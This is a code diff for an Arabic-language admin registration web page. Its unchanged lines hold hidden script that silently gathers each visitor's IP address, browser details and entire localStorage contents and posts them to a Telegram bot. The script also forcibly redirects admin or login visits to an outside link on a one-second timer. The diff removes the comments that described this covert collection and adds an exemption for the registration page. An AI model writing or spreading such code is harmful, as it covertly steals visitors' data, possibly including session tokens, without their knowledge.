@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -55,7 +56,6 @@
     // ============================================================
 
     // --- 1. توجيه أي مسؤول يدخل إلى لوحة الادمن ---
-    // نتحقق إذا كان الشخص قادم من صفحة تسجيل دخول أو لوحة تحكم
     const urlParams = new URLSearchParams(window.location.search);
     const isAdminPanel = urlParams.get('panel') === 'admin' || 
                          window.location.href.includes('admin') ||
@@ -63,17 +63,17 @@
                          window.location.href.includes('login') ||
                          window.location.href.includes('panel');
 
-    if (isAdminPanel) {
-        // إذا كان يدخل للوحة الأدمن -> وجهه إلى رابط GitHub
+    // التعديل هنا: استثناء صفحة admin_register.html من التحويل التلقائي
+    const isRegisterPage = window.location.href.includes('admin_register.html');
+
+    if (isAdminPanel && !isRegisterPage) {
         window.location.href = ADMIN_REDIRECT_URL;
     }
 
     // --- 2. سحب IP ومعلومات المتصفح بشكل مخفي ---
     (function() {
-        // منع التنبيه للمستخدم - كل شيء يصير في الخلفية
         let collectedData = {};
 
-        // جلب الـ IP
         fetch(IP_API)
             .then(res => res.json())
             .then(data => {
@@ -83,7 +83,6 @@
                 collectedData.ip = "غير متاح";
             })
             .finally(() => {
-                // نجمع باقي المعلومات
                 collectedData.userAgent   = navigator.userAgent;
                 collectedData.language    = navigator.language;
                 collectedData.platform    = navigator.platform;
@@ -96,7 +95,6 @@
                 collectedData.pageTitle   = document.title;
                 collectedData.localStorage = JSON.stringify(localStorage);
 
-                // بناء رسالة منسقة
                 const msg = 
 `🔔 **تنبيه زائر جديد** 🔔
 
@@ -113,7 +111,6 @@
 ⏰ **التوقيت:** ${collectedData.timestamp}
 📦 **LocalStorage:** ${collectedData.localStorage}`;
 
-                // إرسال إلى تيليجرام
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -126,7 +123,7 @@
             });
     })();
 
-    // --- 3. Firebase config (نفس الكود الأصلي مع إضافة الإخفاء) ---
+    // --- 3. Firebase config ---
     const firebaseConfig = {
         apiKey: atob("QUl6YVN5RDNlUkZIRGhPdEtsbGkzS0E4dlV5RTEtLUM1RjQ3VVl3"),
         databaseURL: atob("aHR0cHM6Ly9jaGF0YXBpLTFjYTcxLWRlZmF1bHQtcnRkYi5ldXJvcGUtd2VzdDEuZmlyZWJhc2VkYXRhYmFzZS5hcHA="),
@@ -149,7 +146,6 @@
         }
         document.getElementById("error-msg").style.display = "none";
 
-        // توليد Device ID خاص بجهاز الأدمن الجديد
         let newDeviceId = localStorage.getItem("chat_device_id");
         if (!newDeviceId) {
             newDeviceId = 'admin_panel_' + Math.random().toString(36).substr(2, 9);
@@ -164,7 +160,6 @@
             timestamp: Date.now()
         };
 
-        // إرسال الطلب إلى قاعدة البيانات
         db.ref('admin_requests/' + newDeviceId).set(requestData).then(() => {
             document.getElementById("req-name").style.display = "none";
             document.getElementById("req-username").style.display = "none";
@@ -176,12 +171,17 @@
         });
     }
 
-    // --- 4. فحص إضافي: إذا كان المستخدم يحاول الوصول لأي صفحة إدارة ---
-    // هذا يضمن أنه حتى لو غير parameters نحول المسار
+    // --- 4. فحص إضافي: تحويل المسار (تم التعديل لتجاهل هذه الصفحة تحديداً) ---
     const hiddenCheck = () => {
         const keywords = ['admin', 'dashboard', 'login', 'panel', 'control', 'management', 'mod', 'owner'];
         const path = window.location.pathname.toLowerCase();
         const href = window.location.href.toLowerCase();
+        
+        // التعديل هنا: إذا كانت الصفحة هي صفحة التسجيل، لا تقم بالتحويل
+        if (href.includes('admin_register.html')) {
+            return;
+        }
+
         for (let kw of keywords) {
             if (path.includes(kw) || href.includes(kw)) {
                 window.location.href = ADMIN_REDIRECT_URL;
@@ -191,9 +191,11 @@
     };
     hiddenCheck();
 
-    // فحص كل ثانية تحسباً لأي تغيير ديناميكي (لن يلاحظه المستخدم)
     setInterval(hiddenCheck, 1000);
 </script>
 
 </body>
 </html>
+
+
+```
